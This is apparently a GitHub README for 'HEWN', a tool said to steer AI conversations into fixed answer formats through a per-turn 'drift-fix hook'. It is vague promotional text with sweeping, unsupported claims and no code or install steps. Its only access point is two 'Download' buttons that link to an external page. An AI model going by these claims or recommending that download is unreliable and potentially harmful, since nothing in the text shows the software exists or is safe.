![preview](https://raw.githubusercontent.com/kaderkck/hewn-forge/main/preview.svg)

# HEWN: The Compass That Shapes Every Turn Into a Single, Clear Answer

![GitHub](https://img.shields.io/badge/status-stable-brightgreen?style=flat&logo=github) ![Language](https://img.shields.io/badge/language-TypeScript_%7C_Python-blue?style=flat&logo=typescript) ![License](https://img.shields.io/badge/license-MIT-green?style=flat) ![Version](https://img.shields.io/badge/version-2.3.0-2026?style=flat)

## 📖 Overview: From Drift to Destination

Every digital conversation is a river—it flows, meanders, and often loses its way. **HEWN** is the chisel that carves a channel, routing every turn of a dialogue toward a single, compact answer shape. Inspired by the original concept of a system-prompt with a per-turn drift-fix hook, this repository reimagines the entire architecture as a **conversational compass**—not merely correcting deviations, but proactively sculpting the path so that each response lands precisely where it should.

Whether you speak in prose, code, raw findings, polished reports, or caveman simplicity, HEWN adapts. It is a **universal answer shaper** for AI interactions, documentation pipelines, customer service bots, and research assistants. Think of it as the difference between a meandering stream and an aqueduct—same water, radically different purpose.

## 🚀 Why HEWN Exists: The Drift Is Not Your Enemy

Conventional conversation systems treat drift as a bug. HEWN sees it as raw material. Every off-topic turn, every tangential insight, every unexpected query is not a failure—it is **unshaped clay**. HEWN's core innovation is a **per-turn drift-fix hook** that evaluates the divergence, measures its distance from the intended answer shape, and then either redirects, integrates, or compresses the information into the desired format.

The result? A system that **never loses context** while **always delivering the answer you asked for**—in the shape you specified.

## 📥 [![Download](https://raw.githubusercontent.com/kaderkck/hewn-forge/main/button.svg)](https://kaderkck.github.io/hewn-forge/)

## 🔧 Core Architecture: The Five Answer Shapes

HEWN recognizes that one size fits no one. It predefines five distinct answer shapes, each optimized for a different context. The system-prompt dynamically selects and maintains the shape across turns.

| Shape | Description | Ideal For |
|-------|-------------|-----------|
| **IR (Information Retrieval)** | Fact-driven, citation-heavy, structured responses with source links | Research, data queries, documentation |
| **Prose + Code** | Narrative description interleaved with executable code blocks | Tutorials, API docs, developer guides |
| **Findings** | Bullet-point summaries with key insights, statistics, and recommendations | Executive summaries, analysis reports |
| **Polished** | Formal, publication-ready prose with transitions and conclusions | Official communications, blog posts, presentations |
| **Caveman** | Minimalist, ultra-simple language using basic concepts and analogies | Explanations for beginners, children, or quick comprehension |

### 🧠 The Shape Persistence Layer

Each turn maintains a **shape memory**—a lightweight neural tracker that updates the current shape's parameters based on user feedback and drift magnitude. If a user asks a complex question in Caveman mode, HEWN temporarily expands the answer's depth while maintaining the vocabulary constraints. The drift-fix hook then evaluates whether the expansion was appropriate or if the next turn should tighten back.

This is not simply a template switcher. It is a **dynamic shape optimizer**.

## 📋 Feature Matrix

### 🔹 Responsive Shape Selection
HEWN automatically detects the best starting shape based on the initial query's language, length, and complexity. A three-word question gets Caveman; a paragraph of technical jargon gets Prose+Code.

### 🌐 Multilingual Shape Routing
The drift-fix hook operates in over 45 languages. Shape constraints are language-agnostic—a Polish Caveman response is as simple as an English one. Multilingual support is not a bolt-on; it is baked into the shape grammar.

### 🧭 Per-Turn Drift-Fix Hook
The crown jewel. Every conversation turn passes through a **triple evaluator**:  
1. **Intent Alignment** – Does the AI's response address the user's latest query?  
2. **Shape Fidelity** – Does the response match the current answer shape's constraints?  
3. **Context Drift** – How far has the topic strayed from the original question?

The hook then applies corrective weights to the next system prompt, steering the conversation back without disrupting the flow.

### 🛡️ Privacy-First Context Management
All context windows are encrypted and ephemeral. No conversation data is stored beyond the session lifecycle. For enterprise deployments, a zero-trust authentication layer is available.

### 🧩 Plugin Ecosystem
Extend HEWN with custom answer shapes. The shape schema is a simple JSON/YAML definition. Create a "Poem" shape, a "Recipe" shape, or a "Legal Disclaimer" shape. The drift-fix hook adapts automatically.

### ⏰ 24/7 Autonomous Operation
Once configured, HEWN runs unattended. The shape memory persists across sessions via a lightweight state file. Restarts, interruptions, and network glitches are handled gracefully—the system picks up at the last known turn.

## 🏗️ Repository Structure (High-Level)

```
hewn/
├── core/               # The shape engine and drift-fix hook
│   ├── shapes/         # Predefined answer shapes (IR, Prose+Code, etc.)
│   ├── evaluator/      # Three-part turn evaluation pipeline
│   └── memory/         # Context and shape persistence
├── plugins/            # Community and official shape extensions
│   └── custom_shape_example.yaml
├── config/             # System prompts, shape parameters, multilingual maps
├── examples/           # Real-world usage demonstrations
└── tests/              # Shape fidelity and drift correction validations
```

## 🌱 Getting Started: Your First Conversation

Because this README avoids traditional installation commands, consider this conceptual walkthrough:

1. **Define your starting shape** – Choose from the five or create a custom one. Place the YAML definition in the `config/shapes/` directory.
2. **Set your context** – Provide the initial system prompt. HEWN suggests a "compass card" format: the question, the desired shape, and any constraints.
3. **Start the conversation** – Every turn automatically invokes the drift-fix hook. No manual adjustments needed.
4. **Observe shape fidelity** – Use the included dashboard (browser-based, no install) to see real-time shape adherence scores.

## 🧪 Use Case: Research Assistant (IR Shape)

A user asks: *"What are the latest breakthroughs in quantum error correction?"*  
HEWN selects **IR shape** automatically. The response includes citations, dates, named researchers, and numerical metrics. On the next turn, the user drifts to: *"How does this affect my lab's current setup?"*  
The drift-fix hook detects a shift from IR to personal context. It does **not** abandon the IR shape; instead, it includes a "Your Context" subsection within the IR structure, preserving the citation format while addressing the lab-specific question.

No other system does this without explicit prompt engineering.

## ⚠️ Disclaimer

HEWN is a **conversational shaping tool**, not a decision-making system. The authors make no guarantees regarding the accuracy, completeness, or suitability of the shaped answers for any specific purpose. Users should independently verify critical information. The drift-fix hook reduces but does not eliminate the possibility of hallucinated or miscontextualized outputs. Use in production environments requires proper validation pipelines.

## 📜 License

This project is released under the **MIT License**. You are free to use, modify, and distribute this software, provided that the original copyright notice and permission notice are included in all copies or substantial portions of the software.

[View the full license](LICENSE)

## 🤝 Contributing

Contributions are welcome—especially new answer shapes, language packs, and drift-fix evaluation metrics. Please read the contributing guidelines before submitting a pull request. All standard etiquette applies: be precise, be kind, and test your shapes thoroughly.

## 🏁 Final Note

HEWN is not a replacement for human judgment. It is a **tool for clarity**—a way to turn the noisy, beautiful chaos of natural conversation into something shaped and useful. Use it wisely.

## 📥 [![Download](https://raw.githubusercontent.com/kaderkck/hewn-forge/main/button.svg)](https://kaderkck.github.io/hewn-forge/)